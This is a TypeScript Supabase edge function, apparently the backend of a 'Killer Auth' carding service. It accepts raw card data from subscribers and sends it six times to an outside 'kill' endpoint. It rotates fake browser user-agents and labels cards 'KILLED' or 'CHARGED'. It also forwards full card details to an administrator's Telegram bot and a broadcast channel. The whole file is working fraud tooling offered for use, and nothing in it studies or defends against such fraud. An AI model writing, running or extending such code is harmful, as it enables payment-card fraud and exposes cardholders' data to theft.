import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
  "Access-Control-Max-Age": "86400",
};

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;

// Notify charged card (fire-and-forget) - broadcasts to channel
const notifyChargedCard = (
  userId: string,
  cardDetails: string,
  status: "CHARGED" | "DECLINED" | "UNKNOWN",
  responseMessage: string,
  amount: string,
  gateway: string
) => {
  const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
  if (!SUPABASE_SERVICE_ROLE_KEY) return;

  fetch(`${SUPABASE_URL}/functions/v1/notify-charged-card`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}`,
    },
    body: JSON.stringify({
      user_id: userId,
      card_details: cardDetails,
      status,
      response_message: responseMessage,
      amount,
      gateway,
    }),
  }).catch((err) => console.error("[KILLER-AUTH] notify-charged-card error:", err));
};

// Send admin debug notification via Telegram (fire-and-forget)
const sendAdminDebug = (cardDetails: string, rawResponse: string) => {
  const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
  const ADMIN_TELEGRAM_CHAT_ID = Deno.env.get("ADMIN_TELEGRAM_CHAT_ID");
  
  if (!TELEGRAM_BOT_TOKEN || !ADMIN_TELEGRAM_CHAT_ID) return;

  const message = `🔍 <b>Killer Auth Debug</b>\n\n` +
    `<b>Card:</b> <code>${cardDetails}</code>\n` +
    `<b>Status:</b> UNKNOWN\n\n` +
    `<b>Raw API Response:</b>\n<pre>${rawResponse.substring(0, 3000)}</pre>`;

  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: ADMIN_TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: "HTML",
    }),
  }).catch((err) => console.error("[KILLER-AUTH] admin debug error:", err));
};

const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
];

// Determine status from API response - "success": true means killed
const getStatusFromResponse = (responseData: any): "killed" | "unknown" => {
  if (responseData && responseData.success === true) {
    return "killed";
  }
  return "unknown";
};

// Perform 6 sequential API checks and combine results
const performChecks = async (cc: string): Promise<{
  computedStatus: "killed" | "unknown";
  attempts: { attempt: number; status: string; response: string; time: string }[];
  killedCount: number;
  failedCount: number;
  errorCount: number;
  totalTime: string;
}> => {
  const apiUrl = `http://killer-production.up.railway.app/kill?cc=${cc}`;
  const attempts: { attempt: number; status: string; response: string; time: string }[] = [];
  let isKilled = false;
  const startTime = Date.now();

  for (let i = 1; i <= 6; i++) {
    const attemptStart = Date.now();
    const userAgent = userAgents[i - 1] || userAgents[0];

    console.log(`[KILLER-AUTH] Attempt ${i}/6 - Calling API with UA: ${userAgent.substring(0, 50)}...`);

    try {
      const response = await fetch(apiUrl, {
        method: 'GET',
        headers: {
          'User-Agent': userAgent,
          'Accept': 'application/json, text/plain, */*',
          'Accept-Language': 'en-US,en;q=0.9',
          'Cache-Control': 'no-cache',
          'Pragma': 'no-cache',
        }
      });

      const rawText = await response.text();
      const attemptTime = ((Date.now() - attemptStart) / 1000).toFixed(2);
      console.log(`[KILLER-AUTH] Attempt ${i} response: ${rawText.substring(0, 200)}`);

      let attemptKilled = false;
      try {
        const jsonData = JSON.parse(rawText);
        attemptKilled = jsonData.success === true;
      } catch {
        attemptKilled = false;
      }

      if (attemptKilled) {
        isKilled = true;
      }

      attempts.push({
        attempt: i,
        status: attemptKilled ? "KILLED" : "FAILED",
        response: rawText.substring(0, 150) + (rawText.length > 150 ? "..." : ""),
        time: attemptTime
      });
    } catch (error) {
      const attemptTime = ((Date.now() - attemptStart) / 1000).toFixed(2);
      const errMsg = error instanceof Error ? error.message : "Connection failed";
      console.error(`[KILLER-AUTH] Attempt ${i} error:`, error);

      attempts.push({
        attempt: i,
        status: "ERROR",
        response: errMsg,
        time: attemptTime
      });
    }

    // Small delay between requests
    if (i < 6) {
      await new Promise(resolve => setTimeout(resolve, 500));
    }
  }

  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
  const killedCount = attempts.filter(a => a.status === "KILLED").length;
  const failedCount = attempts.filter(a => a.status === "FAILED").length;
  const errorCount = attempts.filter(a => a.status === "ERROR").length;

  return {
    computedStatus: isKilled ? "killed" : "unknown",
    attempts,
    killedCount,
    failedCount,
    errorCount,
    totalTime
  };
};

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    // REQUIRE AUTHENTICATION
    const authHeader = req.headers.get("Authorization");
    if (!authHeader?.startsWith("Bearer ")) {
      return new Response(
        JSON.stringify({ error: "Unauthorized" }),
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    // VERIFY USER TOKEN
    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
      global: { headers: { Authorization: authHeader } },
    });

    const { data: { user }, error: authError } = await supabase.auth.getUser();
    if (authError || !user) {
      return new Response(
        JSON.stringify({ error: "Invalid token" }),
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    // CHECK USER IS NOT BANNED
    const { data: profile } = await supabase
      .from("profiles")
      .select("is_banned, username")
      .eq("user_id", user.id)
      .single();

    if (profile?.is_banned) {
      return new Response(
        JSON.stringify({ error: "Account suspended" }),
        { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    const { cc } = await req.json();
    
    if (!cc) {
      return new Response(
        JSON.stringify({ 
          error: 'Card data (cc) is required', 
          computedStatus: 'unknown',
          apiStatus: 'ERROR',
          apiMessage: 'Card data (cc) is required'
        }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    console.log('[KILLER-AUTH] Checking card for user:', user.id);
    console.log('[KILLER-AUTH] Sending 6 sequential requests...');

    // Perform 6 sequential checks and get combined results
    const data = await performChecks(cc);

    // Send admin debug notification for UNKNOWN results only
    if (data.computedStatus === 'unknown') {
      const debugResponses = data.attempts.map(a => `#${a.attempt}: ${a.response}`).join("\n");
      sendAdminDebug(cc, debugResponses);
    }

    // Build combined API message showing all 6 attempts
    const attemptsSummary = data.attempts.map(a => 
      `#${a.attempt} ${a.status === 'KILLED' ? '🟢' : a.status === 'ERROR' ? '⚠️' : '🔴'} ${a.status} (${a.time}s)`
    ).join(' | ');

    const combinedMessage = data.computedStatus === 'killed'
      ? `🟢 KILLED SUCCESSFULLY 🔥 | ${data.killedCount}/6 killed | ${data.totalTime}s total`
      : `🔴 NOT KILLED | 0/6 killed | ${data.failedCount} failed, ${data.errorCount} errors | ${data.totalTime}s total`;

    // Return combined response with all attempt details
    const responseData = {
      computedStatus: data.computedStatus,
      apiStatus: data.computedStatus === 'killed' ? 'KILLED' : 'UNKNOWN',
      apiMessage: combinedMessage,
      attempts: data.attempts,
      summary: {
        killedCount: data.killedCount,
        failedCount: data.failedCount,
        errorCount: data.errorCount,
        totalTime: data.totalTime
      }
    };

    return new Response(
      JSON.stringify(responseData),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error: unknown) {
    const errorMessage = error instanceof Error ? error.message : 'Unknown error';
    console.error('[KILLER-AUTH] Error:', errorMessage);
    
    return new Response(
      JSON.stringify({ 
        error: errorMessage, 
        status: "ERROR",
        computedStatus: "unknown",
        apiStatus: "ERROR",
        apiMessage: errorMessage
      }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});
